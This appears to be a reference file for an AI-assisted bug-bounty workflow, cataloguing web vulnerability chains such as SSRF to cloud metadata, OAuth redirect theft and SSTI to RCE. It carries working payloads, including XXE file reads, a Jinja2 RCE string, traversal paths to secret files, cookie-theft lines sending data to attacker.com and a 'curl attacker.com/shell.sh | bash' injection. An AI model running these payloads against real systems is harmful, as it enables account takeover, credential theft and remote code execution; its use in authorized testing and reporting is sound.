# Bug Chain Encyclopedia — Vulnerability Chaining Reference
> Source: Disclosed HackerOne/Intigriti reports, PortSwigger research, real-world exploitation patterns | RAG Knowledge Base | Full detail preserved
> Core principle: A single bug is a finding. A chain is a payday.
> Related: `chain-builder.md` (operational skill), `portswigger-advanced.md`, `saml-attacks.md`, `ci-cd-attacks.md`

---

## How to Use This File

Each chain entry answers four questions:
1. **Trigger condition** — what bug or observation activates this chain
2. **Bridge** — what connects finding A to finding B
3. **Exploitation steps** — ordered actions with concrete endpoints/params
4. **Final impact** — what an attacker achieves (severity anchor for report)

Before closing ANY finding — even Info/Low — run the **Chain Checklist** at the bottom.

**Severity rule:** Report as ONE finding at the highest severity the full chain achieves. Title format: `Chained: [A] + [B] leads to [IMPACT]`.

---

## Chain Discovery Framework

### Step 1 — Inventory All Findings
Map every confirmed finding regardless of severity:
- Information disclosure (emails, IDs, tokens, internal URLs, stack traces)
- State modification (create/update/delete without proper auth)
- Request forgery (CSRF, SSRF, open redirect)
- Client-side execution (XSS, postMessage, DOM clobbering)
- Logic flaws (race, negative price, step skip)

### Step 2 — For Each Finding, List What It ENABLES
| Finding type | Typically enables |
|---|---|
| Open redirect | OAuth code/token theft, SSRF filter bypass, phishing |
| SSRF | Cloud metadata, internal admin panels, blind port scan |
| XSS | Session theft, CSRF bypass, admin action, postMessage abuse |
| IDOR (read) | PII harvest, password reset targeting, privilege recon |
| IDOR (write) | Account modification, role field tampering |
| Subdomain takeover | Cookie theft, OAuth redirect_uri abuse, CSP bypass |
| XXE | SSRF, file read, SSRF-to-IMDS |
| Path traversal | Secret read, source code, `/proc/self/environ` |
| Cache poisoning | Stored XSS at scale, open redirect distribution |
| JWT weakness | Forge admin token, algorithm confusion |
| CORS misconfig | Cross-origin data exfil from authenticated endpoints |
| GraphQL introspection | Hidden mutations, IDOR via batching |
| Information disclosure | API keys in JS, internal hostnames for SSRF |

### Step 3 — Look for Bridges
```
Finding A reveals X  →  Finding B requires X as input
Finding A accesses Y →  Y has weaker auth than Z
Finding A modifies state →  Finding B assumes that state
Finding A is "self-only" →  Finding B delivers it to victim/admin
```

### Step 4 — Test End-to-End Before Reporting
Document every hop with request/response. Calculate ACTUAL impact — not theoretical.

---

## Tier 1 Chains — Critical Impact (Payout Multipliers)

### CHAIN-001: Open Redirect → OAuth Authorization Code Theft → ATO
**Trigger:** Open redirect on same domain or parent domain used in OAuth flow
**Bridge:** OAuth `redirect_uri` validation allows path-relative or same-origin redirects
**CWE:** CWE-601, CWE-287

**Steps:**
1. Find open redirect: `/redirect?url=https://attacker.com` or `/logout?next=//attacker.com`
2. Identify OAuth authorize endpoint: `/oauth/authorize?client_id=X&redirect_uri=...&response_type=code`
3. Test if `redirect_uri` accepts:
   - Path-relative: `redirect_uri=/redirect?url=https://attacker.com`
   - Subpath: `redirect_uri=https://target.com/redirect?url=https://attacker.com`
   - Wildcard subdomain if parent sets cookies broadly
4. Victim clicks crafted authorize URL → authenticates → code appended to attacker URL
5. Attacker exchanges code at token endpoint (if `client_secret` leaked or public client)

**Variations:**
- **Implicit flow:** Token in URL fragment — exfil via Referer if redirect lands on attacker page with third-party resources
- **PKCE bypass:** Downgrade `code_challenge_method` from S256 to plain
- **Pre-registered redirect:** Subdomain takeover on allowed `redirect_uri` host

**Impact:** Full account takeover
**Tools:** Burp, custom OAuth client, disclosed client IDs from JS bundles
**Related skill files:** `portswigger-advanced.md` (OAuth/JWT), `saml-attacks.md`, `subdomain-takeover.md`

---

### CHAIN-002: SSRF → Cloud Metadata → IAM Credentials → Infrastructure Compromise
**Trigger:** SSRF in any URL/fetch/webhook/import parameter
**Bridge:** Application runs on AWS/GCP/Azure with IMDS accessible from app server
**CWE:** CWE-918, CWE-200

**Steps:**
1. Confirm SSRF: `url=http://127.0.0.1`, `url=http://169.254.169.254`
2. AWS IMDSv1: `GET http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. AWS IMDSv2: First `PUT http://169.254.169.254/latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds: 21600`, then use token
4. Retrieve role name → fetch temporary AKIA keys
5. Use keys: S3 bucket listing, Lambda deploy, EC2 snapshot, Secrets Manager

**GCP:** `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` with header `Metadata-Flavor: Google`

**Azure:** `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` with header `Metadata: true`

**Bypass patterns for SSRF filters:**
- Alternative IP: `2130706433`, `0x7f000001`, `127.1`
- DNS rebinding: `spoofed.burpcollaborator.net` → 127.0.0.1
- Redirect chain: allowed URL → open redirect → metadata
- IPv6: `http://[::1]/`, `http://0000::1:80/`

**Impact:** Critical — cloud account compromise, data exfil, persistence
**Related:** `cloud-attacks.md`, `portswigger-advanced.md` (SSRF section)

---

### CHAIN-003: SSRF → Internal Admin Panel → RCE
**Trigger:** SSRF + internal services on private network
**Bridge:** Admin interfaces bound to internal IP only, no auth from "trusted" network

**Steps:**
1. SSRF confirmed (even blind — use timing/OAST)
2. Port scan via SSRF: common ports 8080, 8443, 3000, 5000, 9200, 2375 (Docker)
3. Hit internal admin: `http://192.168.x.x:8080/admin`, `http://127.0.0.1:9000`
4. Interact via SSRF: create user, upload file, run job, trigger Groovy/script console

**High-value internal targets:**
- Jenkins `/script` — Groovy RCE
- Apache Solr — config API
- Redis — unauthenticated write
- Elasticsearch — query API
- Docker API 2375 — container spawn
- Kubernetes API — if SA token in env

**Impact:** Critical RCE
**Related:** `cloud-attacks.md`, `ci-cd-attacks.md`

---

### CHAIN-004: XXE → SSRF → File Read / IMDS
**Trigger:** XML input parsed with external entities enabled
**Bridge:** XXE can force server-side HTTP requests (SSRF primitive)

**Payloads:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
```

**Impact:** File read + cloud credential theft
**Related:** `portswigger-injection.md` (XXE), `portswigger-advanced.md` (SSRF)

---

### CHAIN-005: IDOR (Read PII) → Password Reset / OTP Bypass → ATO
**Trigger:** IDOR leaks email, phone, security questions, partial tokens
**Bridge:** Password reset or MFA recovery uses leaked identifier

**Steps:**
1. IDOR: `/api/users/123` → `{"email":"victim@corp.com","phone":"+1..."}`
2. Enumerate users via sequential/GUID leaks in other endpoints
3. Initiate password reset for victim
4. If OTP sent to phone/email attacker controls via IDOR leak → full ATO
5. If reset token in response (API bug) → direct ATO

**Variations:**
- **Host header injection** on reset email → poison reset link domain
- **Race condition** on reset token validation — use token twice
- **Token in URL** logged/referrer leaked

**Impact:** Critical — arbitrary user ATO
**CWE:** CWE-639, CWE-862
**Related:** `auth-bypass.md`, `logic-bugs.md`

---

### CHAIN-006: IDOR (Write) → Role/Privilege Field Tampering → Admin
**Trigger:** Update profile/account endpoint accepts `role`, `isAdmin`, `user_type`, `group_id`
**Bridge:** Server applies client-supplied privilege fields without server-side validation

**Steps:**
1. Capture legitimate profile update: `PUT /api/user/me {"name":"test"}`
2. Add: `{"name":"test","role":"admin"}` or `{"isAdmin":true}`
3. Verify elevated access: admin endpoints, other users' data
4. Horizontal → vertical: IDOR read admin user ID, then impersonate via cookie/session fixation

**Common parameter names:**
`role`, `roles[]`, `admin`, `is_admin`, `isAdmin`, `userType`, `account_type`, `permissions`, `access_level`, `group`, `org_role`

**Impact:** Critical — vertical privilege escalation
**Related:** `portswigger-extra.md` (access control), `owasp-top10-2021.md` (A01)

---

### CHAIN-007: Stored XSS → Admin Session Theft (No CSRF Needed)
**Trigger:** Stored XSS in field viewed by admins (support tickets, username, org name, invoice notes)
**Bridge:** Admin routinely views user-controlled content

**Steps:**
1. Find stored XSS in user-controllable field (not just self-view)
2. Payload: `fetch('https://attacker.com/?c='+document.cookie)` or exfil via DNS
3. If HttpOnly: use XSS to perform actions in admin context (create admin user, disable MFA)
4. **Service worker persistence:** register SW for origin → survives page navigation

**HttpOnly bypass chains:**
- XSS → change victim email → password reset
- XSS → CSRF to disable MFA endpoint
- XSS → fetch internal API same-origin (no cookie needed if same-origin credentialed fetch)
- XSS → postMessage to parent frame with secrets

**Impact:** Critical admin ATO
**Related:** `portswigger-advanced.md` (XSS, CSP bypass)

---

### CHAIN-008: Self-XSS + CSRF → Admin Action (Self-XSS Upgrade)
**Trigger:** Self-XSS (only executes for attacker) + CSRF on admin "view user" action
**Bridge:** Admin CSRF loads attacker's poisoned profile

**Steps:**
1. Self-XSS in profile/bio field — normally N/A or Informative
2. Find CSRF: admin panel `GET /admin/users/view?id=ATTACKER_ID` (no CSRF token)
3. Trick admin into visiting CSRF URL or embed in support ticket
4. XSS fires in admin browser context

**Impact:** Medium + Low → Critical
**Related:** `chain-builder.md`, `portswigger-advanced.md` (CSRF)

---

### CHAIN-009: Subdomain Takeover → Session Hijack / OAuth Theft
**Trigger:** Dangling CNAME to Heroku, GitHub Pages, Azure, S3, Fastly, etc.
**Bridge:** Parent domain sets cookies with `Domain=.example.com` OR OAuth allows subdomain redirect_uri

**Steps:**
1. Find dangling DNS: `subdomain.example.com` → unclaimed service
2. Claim service, serve attacker page
3. **Cookie theft:** `document.location='https://attacker.com/?c='+document.cookie`
4. **OAuth:** if `redirect_uri=https://subdomain.example.com/callback` is registered

**Check cookie scope:**
```javascript
// In browser on example.com — check Set-Cookie Domain attribute
// document.cookie on taken subdomain may receive parent cookies
```

**Impact:** High to Critical depending on cookie/OAuth scope
**Related:** `subdomain-takeover.md`, `portswigger-advanced.md` (OAuth)

---

### CHAIN-010: Cache Poisoning → Stored XSS at Scale
**Trigger:** Unkeyed header/input reflected in cached response (e.g., `X-Forwarded-Host`, `X-Original-URL`)
**Bridge:** CDN caches poisoned response, serves to all users

**Steps:**
1. Identify unkeyed input affecting response (Param Miner / manual)
2. Inject XSS payload via unkeyed header
3. Confirm cache HIT on victim request
4. All users receive XSS

**Impact:** Critical mass XSS
**Related:** `portswigger-advanced.md` (cache poisoning)

---

### CHAIN-011: Web Cache Deception → Account Data Leak
**Trigger:** Dynamic URL treated as static by cache (extension trick: `/account/settings.css`)
**Bridge:** CDN caches authenticated response at cacheable URL

**Steps:**
1. Find endpoint returning sensitive data: `/account/settings`
2. Append static extension: `/account/settings/nonexistent.css`
3. Send with victim's session, then fetch unauthenticated — if cached, PII leak

**Impact:** High — mass account data disclosure
**Related:** `portswigger-injection2.md` (cache deception)

---

### CHAIN-012: Blind SSRF + CORS Misconfiguration → Internal Data Exfil
**Trigger:** Blind SSRF + internal API with `Access-Control-Allow-Origin: *` or reflecting Origin
**Bridge:** SSRF reaches internal JSON API; CORS allows cross-origin read from attacker page

**Steps:**
1. Confirm blind SSRF (OAST callback)
2. SSRF to internal: `http://internal-api.local/admin/users`
3. If internal API returns ACAO:* with sensitive JSON — chain with XSS or direct if SSRF returns body in some code paths

**Alternative:** SSRF to attacker-controlled redirect that points to internal — some apps follow redirects and return final body

**Impact:** High — internal data exfiltration
**Related:** `portswigger-advanced.md` (CORS, SSRF)

---

### CHAIN-013: JWT Weak Secret / Algorithm Confusion → Forge Admin Token
**Trigger:** JWT in cookie/header, HS256 with weak secret OR RS256 with public key as HMAC secret
**Bridge:** Application accepts attacker-forged JWT

**Attack paths:**
- **Crack HS256:** hashcat/jwt_tool with rockyou if secret weak
- **alg:none:** `{"alg":"none"}` unsigned token
- **RS256→HS256:** sign with leaked/confused public key
- **kid injection:** `kid=../../dev/null` → empty HMAC key

**Impact:** Critical — full authentication bypass
**Related:** `portswigger-advanced.md` (JWT), `auth-bypass.md`

---

### CHAIN-014: GraphQL Batching/Aliases → IDOR at Scale
**Trigger:** GraphQL endpoint without rate limits on batched queries
**Bridge:** Single request with 1000 aliased user queries bypasses per-request auth checks

```graphql
query {
  u1: user(id: 1) { email phone ssn }
  u2: user(id: 2) { email phone ssn }
  ...
}
```

**Impact:** Critical mass PII disclosure
**Related:** `portswigger-advanced.md` (GraphQL), `api-testing.md`

---

### CHAIN-015: Path Traversal → `/proc/self/environ` → Secret → RCE
**Trigger:** File read via path traversal
**Bridge:** Environment variables contain DB creds, API keys, cloud tokens

**Payloads:**
```
....//....//....//proc/self/environ
....//....//....//proc/self/cmdline
....//....//....//var/www/html/.env
....//....//....//app/config/database.yml
```

**Impact:** Critical — credential theft → RCE via DB/admin panel
**Related:** `portswigger-extra.md` (path traversal)

---

### CHAIN-016: SSTI → RCE
**Trigger:** User input reflected in server-side template (Jinja2, Twig, Freemarker, Velocity)
**Bridge:** Template engine eval

**Detection:** `${7*7}`, `{{7*7}}`, `#{7*7}`, `*{7*7}`

**Jinja2 RCE (example):**
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Impact:** Critical RCE
**Related:** `portswigger-injection2.md` (SSTI)

---

### CHAIN-017: HTTP Request Smuggling → Bypass WAF → Exploit Stored XSS/Admin
**Trigger:** CL.TE or TE.CL desync between front-end and back-end
**Bridge:** Smuggled request bypasses front-end access controls

**Impact:** Critical — credential theft, access control bypass
**Related:** `portswigger-advanced.md` (request smuggling)

---

### CHAIN-018: SAML XSW → Authentication Bypass → Admin SSO
**Trigger:** SAML SP with XML signature wrapping vulnerability
**Bridge:** Signature validates signed assertion; app processes unsigned injected assertion

**Steps:**
1. Capture valid SAML Response (SAML-tracer, Burp)
2. SAML Raider → test XSW variants 1-8
3. Inject assertion with `NameID=admin@target.com`
4. If session created → full SSO bypass

**Impact:** Critical — authentication bypass, often admin
**Related:** `saml-attacks.md`

---

### CHAIN-019: CI/CD Workflow Injection → OIDC Token Theft → Cloud/Registry Publish
**Trigger:** User-controlled input in GitHub Actions workflow context (`github.event.issue.title`, PR title)
**Bridge:** Expression `${{ }}` evaluated in workflow YAML → code execution on runner

**Steps:**
1. Find injection: issue/PR title `"; curl attacker.com/shell.sh | bash; echo "`
2. Or: `pull_request_target` running untrusted fork code with base repo secrets
3. Dump runner memory for OIDC JWT → assume AWS role / publish to npm

**Impact:** Critical — supply chain compromise
**Related:** `ci-cd-attacks.md`

---

### CHAIN-020: Prototype Pollution → RCE / Auth Bypass (Node.js)
**Trigger:** `merge({}, userInput)` or similar deep merge on attacker JSON
**Bridge:** Polluted `__proto__` affects application logic

**Gadget chains:**
- Pollute `isAdmin` default on Object prototype
- Express `outputFunctionName` gadget → RCE in Pug templates
- Client-side PP → bypass URL checks → DOM XSS

**Impact:** High to Critical
**Related:** `portswigger-advanced.md` (prototype pollution)

---

## Tier 2 Chains — High Impact

### CHAIN-021: CSRF → Change Email → ATO
**Trigger:** State-changing action without CSRF token (email change, password change)
**Bridge:** Email change → attacker receives password reset

**Impact:** High ATO

---

### CHAIN-022: Clickjacking → OAuth Consent / Account Linking
**Trigger:** No `X-Frame-Options` / CSP `frame-ancestors` on OAuth consent page
**Bridge:** Victim clicks invisible "Authorize" button

**Impact:** High — linked account / token grant

---

### CHAIN-023: Host Header Injection → Password Reset Poisoning
**Trigger:** Reset link built from Host header or X-Forwarded-Host
**Bridge:** Attacker receives victim reset token

**Payload:** `Host: attacker.com` on reset request

**Impact:** High ATO
**Related:** `portswigger-extra.md` (host header)

---

### CHAIN-024: Race Condition → Double Spend / Coupon Reuse
**Trigger:** TOCTOU on balance/coupon/redemption endpoints
**Bridge:** Parallel requests before balance check completes

**Tools:** Turbo Intruder, parallel curl, race-the-web

**Impact:** High financial impact
**Related:** `portswigger-extra.md` (race conditions)

---

### CHAIN-025: File Upload Bypass → Webshell → RCE
**Trigger:** Upload with extension/MIME bypass
**Bridge:** Uploaded file served/executed from web root

**Bypasses:** `shell.php.jpg`, `%00.php`, `.phtml`, SVG with script, polyglot JPEG+PHP

**Impact:** Critical RCE
**Related:** `portswigger-injection.md` (file upload)

---

### CHAIN-026: Insecure Deserialization → RCE
**Trigger:** Java serialized object, PHP `unserialize()`, Python pickle in cookie/param
**Bridge:** Gadget chain executes attacker-controlled object

**Impact:** Critical RCE
**Related:** `portswigger-extra.md` (deserialization)

---

### CHAIN-027: WebSocket Hijacking / CSWSH → Account Action
**Trigger:** WebSocket auth only at handshake, no Origin check
**Bridge:** Attacker site opens WS to target with victim cookies

**Impact:** High — real-time account manipulation
**Related:** `portswigger-advanced.md` (WebSockets)

---

### CHAIN-028: postMessage Misconfiguration → XSS / Data Theft
**Trigger:** `window.addEventListener('message')` without origin check
**Bridge:** Attacker iframe posts malicious payload

**Impact:** High
**Related:** browser security (P2)

---

### CHAIN-029: DNS Rebinding → SSRF Filter Bypass → Internal Access
**Trigger:** SSRF filter blocks 127.0.0.1 but allows attacker domain
**Bridge:** Attacker DNS alternates between external IP and 127.0.0.1

**Impact:** High to Critical
**Related:** `subdomain-takeover.md`, cloud-attacks.md

---

### CHAIN-030: Information Disclosure (API Key in JS) → Cloud/API Abuse
**Trigger:** AWS key, Stripe sk_live, internal API token in frontend bundle
**Bridge:** Key has broader scope than intended

**Impact:** High to Critical
**Tools:** `/secrets-hunt`, trufflehog, manual JS review

---

## Tier 3 Chains — Medium Upgraded

### CHAIN-031: Open Redirect → SSRF Filter Bypass
Allowed URL on same domain redirects to internal target. See CHAIN-002 bypass.

### CHAIN-032: CRLF Injection → Header Injection → XSS/Cache Poison
Inject `\r\nSet-Cookie:` or `\r\nLocation:` via user input in headers.

### CHAIN-033: LDAP Injection → Auth Bypass
`*)(uid=*))(|(uid=*` — wildcard bind.

### CHAIN-034: NoSQL Injection → Auth Bypass
`{"username":{"$ne":""},"password":{"$ne":""}}`

### CHAIN-035: Mass Assignment → Privilege Escalation
Hidden fields in API: `isVerified:true`, `credits:99999`

### CHAIN-036: Referer Leak → Session Token in URL
Sensitive token in URL leaked via Referer to third-party.

### CHAIN-037: PDF/Image SSRF in Document Converter
Upload HTML/SVG with external entity or `<iframe src="http://169.254.169.254">`.

### CHAIN-038: Email Header Injection → Spam/Phishing from Domain
CRLF in contact form `email` field injects Bcc/Cc headers.

---

## Disclosed Report Archetypes (Real Patterns)

| Archetype | Example programs | Chain |
|---|---|---|
| OAuth redirect steal | Multiple H1 reports | Open redirect + OAuth |
| SSRF to IMDS | Capital One class | SSRF → AWS metadata |
| GitHub Actions pwn request | Trivy, popular npm packages | PR target + cache + OIDC |
| SAML XSW admin login | Enterprise SSO targets | XSW variant → admin NameID |
| GraphQL batch IDOR | Fintech, social | Aliased queries → mass PII |
| Cache deception | PayPal-class patterns | `.css` extension → cached account page |
| Subdomain takeover OAuth | Various | Takeover + redirect_uri |
| IDOR + reset | Banking apps | Phone leak + OTP reset |
| Self-XSS + CSRF | Admin panels | Profile XSS + admin view CSRF |
| JWT none algorithm | API-heavy startups | alg:none admin token |

---

## Severity Amplifiers (Use in Report)

| Factor | Effect on severity |
|---|---|
| No user interaction | +1 level |
| Affects all users (not self) | +1 level |
| Financial transaction impact | Critical anchor |
| PII at scale | Regulatory + Critical |
| Persistent access (backdoor, SW, admin) | +1 level |
| Bypasses MFA | +1 level |
| Supply chain / all customers | Critical |
| Unauthenticated attacker | +1 level |

---

## Chain Checklist (Run Before Closing Any Finding)

```
[ ] What data does this finding expose? (IDs, emails, tokens, URLs, roles)
[ ] What actions does this finding enable? (read, write, redirect, fetch, execute)
[ ] Is there an open redirect on same domain?
[ ] Is there SSRF or fetch-from-URL nearby in app?
[ ] Does parent domain set broad cookies? (subdomain chain)
[ ] Is there OAuth/SAML/JWT on this domain?
[ ] Does any admin view user-controlled content?
[ ] Are there internal hostnames/IPs in responses for SSRF?
[ ] Is there a file read that could hit .env or /proc/self/environ?
[ ] Can this finding bypass a filter for another finding?
[ ] Can two "Low" findings combine to Critical impact?
[ ] Did I test the FULL chain end-to-end with evidence?
```

---

## Chain Documentation Template

```markdown
## Chain Summary
**ID:** CHAIN-XXX
**Start:** [Finding A — one line]
**End:** [Final impact]
**Severity:** Critical (CVSS X.X)

## Trigger & Bridge
[Why these bugs connect]

## Step-by-Step Reproduction
### Step 1: [Finding A]
- Request:
- Response:

### Step 2: [Finding B using output from Step 1]
- Request:
- Response:

### Step 3: Final Impact Proof
[Screenshot/response showing impact]

## Why This Matters
[Business impact — 2-3 sentences for triage]

## References
- CWE-XXX
- Related skill: `filename.md`
```

---

## OWASP / CWE Cross-Reference

| Chain category | OWASP 2021 | CWE (common) |
|---|---|---|
| Access control chains | A01 | CWE-639, CWE-862, CWE-863 |
| Crypto/JWT chains | A02 | CWE-327, CWE-347 |
| Injection chains | A03 | CWE-89, CWE-79, CWE-918 |
| Design logic chains | A04 | CWE-840, CWE-367 |
| Misconfig chains | A05 | CWE-16, CWE-942 |
| Component/CI chains | A06 | CWE-829, CWE-494 |
| Auth chains | A07 | CWE-287, CWE-384 |
| SSRF/data chains | A10 | CWE-918, CWE-200 |

---

## Tools Quick Reference

| Chain type | Tools |
|---|---|
| OAuth/SAML | Burp, SAML Raider, jwt_tool, oauth.tools |
| SSRF | Burp Collaborator, ffuf internal paths, cloud metadata scripts |
| XSS chains | DOM Invader, XSS Hunter, Burp |
| Cache chains | Param Miner, Web Cache Deception Scanner |
| Race chains | Turbo Intruder, race-the-web, parallel curl |
| CI/CD chains | GITHUB_TOKEN analysis, OIDC policy review, actionlint |
| IDOR chains | Autorize, custom enumeration scripts |
| GraphQL | Clairvoyance, InQL, batching in Burp |

---

## Anti-Patterns (Stop Grinding)

- Do NOT report self-XSS alone without checking admin CSRF chain
- Do NOT close SSRF as "Low — DNS only" without IMDS/internal probe
- Do NOT accept "Informational" on open redirect without OAuth test
- Do NOT stop at IDOR read if write/update endpoints share same ID pattern
- If same angle fails twice → pivot chain direction or escalate to user
